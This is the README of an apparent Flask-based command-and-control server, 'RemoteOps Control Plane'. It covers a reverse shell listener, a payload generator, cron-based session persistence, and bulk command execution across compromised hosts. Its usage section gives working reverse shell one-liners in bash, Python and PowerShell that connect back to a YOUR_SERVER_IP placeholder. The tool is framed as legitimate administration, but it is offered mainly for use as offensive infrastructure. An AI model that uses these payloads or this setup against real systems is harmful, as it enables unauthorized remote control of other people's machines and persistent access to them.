# RemoteOps Control Plane

A production-ready Flask control plane for legitimate remote administration via SSH and reverse shell management.

## Features

### Control Panel (Unified Dashboard)
- **Single-pane view** for both SSH hosts and reverse shells with tabs
- Real-time connection status indicators
- Group, rename, and delete hosts in bulk
- Orchestration actions (system info, network info, process list, etc.)
- Click-to-select rows and clickable hostnames

### SSH Shell Management
- Interactive xterm.js terminal with full PTY support
- Key-based or password-based authentication (encrypted at rest)
- Jump-host (bastion) connectivity per target
- Multi-tab terminal sessions per host
- Bulk command execution across multiple hosts

### Reverse Shell Management
- **Multi-handler listener** on a configurable port (default: 5000)
- Supports Linux, Windows (PowerShell/cmd), macOS, and custom shells
- Interactive xterm.js terminal with full PTY upgrade
- Persistent connection tracking — reconnecting hosts resume their session
- Platform-aware keepalive (TCP-level, non-destructive)
- Session persistence via cron job installation
- Multi-tab sessions, fullscreen mode, keyboard shortcuts

### Bulk Operations
- Execute commands across selected SSH hosts and reverse shells
- Export execution history to CSV/JSON/Excel
- Import hosts from CSV

### Payload Generator
- 20+ reverse shell payloads for Linux, Windows, and web languages
- One-click copy with auto-filled IP and port

### Production Features
- Dark cybersecurity-themed UI with responsive mobile layout
- User management with role-based access (admin/user)
- Browser notifications for new shell connections
- Comprehensive error handling
- Settings page for user/project management

## Project Structure

```
c2_manager/
├── app.py                    # Development entrypoint
├── wsgi.py                   # Production WSGI entrypoint (gunicorn)
├── passenger_wsgi.py         # cPanel Passenger entrypoint
├── requirements.txt          # Python dependencies
├── .env.example              # Environment variable template
├── app/
│   ├── __init__.py           # Flask app factory
│   ├── config.py             # Configuration
│   ├── extensions.py         # Flask extensions (DB, Login, SocketIO, CSRF)
│   ├── models.py             # SQLAlchemy models
│   ├── routes.py             # All HTTP routes
│   ├── forms.py              # WTForms definitions
│   ├── security.py           # Auth & encryption utilities
│   ├── ssh_service.py        # SSH command execution
│   ├── shell_service.py      # Reverse shell listener & handler
│   ├── socket_events.py      # WebSocket event handlers
│   ├── export_utils.py       # CSV/JSON/Excel export
│   ├── utils.py              # General utilities
│   ├── static/
│   │   ├── css/style.css     # Application styles
│   │   ├── img/favicon.svg   # Favicon
│   │   └── vendor/           # Third-party JS (xterm.js, socket.io)
│   └── templates/            # Jinja2 templates
└── migrations/               # Alembic database migrations
```

## Security Model

- App login passwords are hashed with Werkzeug
- SSH credentials are encrypted at rest using `DATA_ENCRYPTION_KEY`
- CSRF protection on all forms and API endpoints
- Strict host key validation by default
- Admin-only host management and user administration
- All connections are logged and tracked

> **Notice**: This tool is designed for legitimate IT operations, infrastructure management, and authorized security testing. Only use on systems you own or have explicit authorization to access.

## Quick Start (Direct Deployment)

### Prerequisites
- Python 3.12+
- Linux/macOS server with a public IP (for reverse shell listener)

### 1. Install

```bash
git clone <repository-url> c2_manager
cd c2_manager
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

### 2. Configure

```bash
cp .env.example .env
```

Edit `.env` and set secure values:
```bash
SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
DATA_ENCRYPTION_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")
ADMIN_PASSWORD='your-strong-admin-password'
```

### 3. Initialize Database

```bash
flask --app app db init
flask --app app db migrate -m "initial schema"
flask --app app db upgrade
flask --app app create-admin
```

### 4. Run

**Development:**
```bash
python app.py
# Web UI: http://localhost:8000
# Reverse shell listener: port 5000
```

**Production (gunicorn + gevent):**
```bash
gunicorn --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
         --workers 1 --bind 0.0.0.0:8000 wsgi:app
```

> **Note:** Use `--workers 1` because the reverse shell listener runs in-process and requires shared state.

### 5. Production with nginx (HTTPS)

Create `/etc/nginx/sites-available/c2_manager`:
```nginx
server {
    listen 80;
    server_name your-domain.com;
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl;
    server_name your-domain.com;

    ssl_certificate     /etc/letsencrypt/live/your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/your-domain.com/privkey.pem;

    location / {
        proxy_pass http://127.0.0.1:8000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

Enable and restart nginx:
```bash
sudo ln -s /etc/nginx/sites-available/c2_manager /etc/nginx/sites-enabled/
sudo nginx -t && sudo systemctl reload nginx
```

### 6. Systemd Service (auto-start)

Create `/etc/systemd/system/c2_manager.service`:
```ini
[Unit]
Description=RemoteOps Control Plane
After=network.target

[Service]
Type=simple
User=www-data
WorkingDirectory=/opt/c2_manager
EnvironmentFile=/opt/c2_manager/.env
ExecStart=/opt/c2_manager/.venv/bin/gunicorn \
    --worker-class geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
    --workers 1 --bind 127.0.0.1:8000 wsgi:app
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable --now c2_manager
```

## cPanel Deployment (HTTPS)

### 1. Upload Project

Upload the project files to your cPanel account, e.g., `~/c2_manager/`.

### 2. Create Python App

1. Go to **cPanel → Setup Python App**
2. Python version: **3.12**
3. Application root: `c2_manager`
4. Application URL: your domain or subdomain
5. Application startup file: `passenger_wsgi.py`
6. Application entry point: `application`
7. Click **Create**

### 3. Install Dependencies

In the Python app terminal (or SSH):
```bash
source /home/<username>/virtualenv/c2_manager/3.12/bin/activate
pip install -r ~/c2_manager/requirements.txt
```

### 4. Set Environment Variables

In cPanel → Setup Python App → Environment variables:
- `SECRET_KEY` = (random string)
- `DATA_ENCRYPTION_KEY` = (random string)
- `DATABASE_URL` = `sqlite:///instance/app.db`
- `ADMIN_PASSWORD` = (your admin password)
- `REVERSE_SHELL_PORT` = `5000`

### 5. Initialize Database

```bash
cd ~/c2_manager
source /home/<username>/virtualenv/c2_manager/3.12/bin/activate
flask --app app db init
flask --app app db migrate -m "initial"
flask --app app db upgrade
flask --app app create-admin
```

### 6. Restart App

Click **Restart** in cPanel Python App settings.

> **Important**: cPanel's Passenger runs on ports 80/443 (HTTP/HTTPS) automatically. The reverse shell listener runs separately on port 5000. Ensure port 5000 is open in your server's firewall.

## Port Configuration

| Service | Default Port | Environment Variable |
|---------|-------------|---------------------|
| Web UI (Flask) | 8000 | `FLASK_RUN_PORT` |
| Reverse Shell Listener | 5000 | `REVERSE_SHELL_PORT` |

- The web UI runs behind nginx (port 443) or cPanel Passenger (port 443) in production
- The reverse shell listener always runs on its own port (default 5000)
- Configure firewall rules to allow incoming connections to the listener port

## Reverse Shell Usage

### Connecting a Shell

**Linux/macOS (Bash):**
```bash
bash -i >& /dev/tcp/YOUR_SERVER_IP/5000 0>&1
```

**Python:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("YOUR_SERVER_IP",5000));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell (Windows):**
```powershell
$c = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP",5000);
$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i);
    $r = (iex $d 2>&1 | Out-String);
    $r2 = $r + "PS " + (pwd).Path + "> ";
    $sb = ([Text.Encoding]::ASCII).GetBytes($r2);
    $s.Write($sb,0,$sb.Length);$s.Flush()
};$c.Close()
```

More payloads are available in the **Payload Generator** page within the web UI.

## Keyboard Shortcuts (Terminal)

| Shortcut | Action |
|----------|--------|
| `Ctrl+Shift+T` | New terminal tab |
| `Ctrl+Shift+W` | Close current tab |
| `Ctrl+Shift+C` | Copy selected text |
| `Ctrl+Shift+V` | Paste from clipboard |
| `Ctrl+Shift+R` | Reconnect terminal |
| `Ctrl+Shift+1-9` | Switch to tab N |

## API Endpoints

### List Sessions
```bash
curl -u admin:password http://localhost:8000/api/sessions
```

### Execute Command
```bash
curl -X POST -u admin:password \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}' \
  http://localhost:8000/execute/<session_id>
```

### Export Data
```bash
curl -u admin:password http://localhost:8000/export/sessions/csv -o sessions.csv
curl -u admin:password http://localhost:8000/export/sessions/json -o sessions.json
```

## License

This project is for authorized use only. See the security notice above.
